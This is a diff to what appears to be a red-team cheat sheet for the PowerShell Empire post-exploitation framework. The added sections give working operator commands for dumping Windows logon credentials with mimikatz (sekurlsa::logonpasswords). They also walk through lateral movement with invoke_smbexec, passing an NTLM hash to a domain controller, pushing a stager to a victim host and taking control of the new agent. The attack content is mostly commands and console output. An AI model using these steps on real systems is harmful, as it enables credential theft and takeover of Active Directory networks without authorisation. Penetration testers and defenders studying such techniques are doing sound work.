@@ -156,12 +156,23 @@ Both of those ways need a stager that must be transferred to victim and activate
 ### Stealing Credentials
 
 ```bash 
-(Empire: TV6GENUD) > mimikatz
 
-[*] Tasked TV6GENUD to run Task 1
-[*] Task 1 results received
-Job started: E4WVFS
-[*] Task 1 results received
+# what do we have?
+
+usemodule credentials/
+
+# lets have some quick win
+
+usemodule credentials/mimikatz/logonpasswords
+
+# mimikatz shell appears
+
+mimikatz(powershell) # sekurlsa::logonpasswords
+
+# or just simply
+
+(Empire: TV6GENUD) > credentials
+
 
 ```
 
@@ -174,5 +185,48 @@ Job started: E4WVFS
 # example for enumerating user
 
 usemodule situational_awareness/network/powerview/get_user
+
+```
+
+### Lateral Movement
+
+How to move around Active Directory
+
+```bash
+
+(Empire) > usemodule lateral_movement/invoke_smbexec
+
+(Empire: powershell/lateral_movement/invoke_smbexec) > info
+
+              Name: Invoke-SMBExec
+            Module: powershell/lateral_movement/invoke_smbexec
+        NeedsAdmin: False
+         OpsecSafe: True
+          Language: powershell
+MinLanguageVersion: 2
+        Background: False
+   OutputExtension: None
+
+
+(Empire: powershell/lateral_movement/invoke_smbexec) > set ComputerName DC1
+
+(Empire: powershell/lateral_movement/invoke_smbexec) > set Listener http
+
+(Empire: powershell/lateral_movement/invoke_smbexec) > set Username admin
+
+(Empire: powershell/lateral_movement/invoke_smbexec) > set Hash a2c475c11da2a0748290d87aa966c327
+
+(Empire: powershell/lateral_movement/invoke_smbexec) > set Domain example.com
+
+(Empire: powershell/lateral_movement/invoke_smbexec) > execute
+
+
+[*] Sending POWERSHELL stager (stage 1) to 10.xx.xx.xx
+[*] New agent B18E4XVK checked in
+
+# talk to new agent
+
+interact B18E4XVK
+
 
 ```
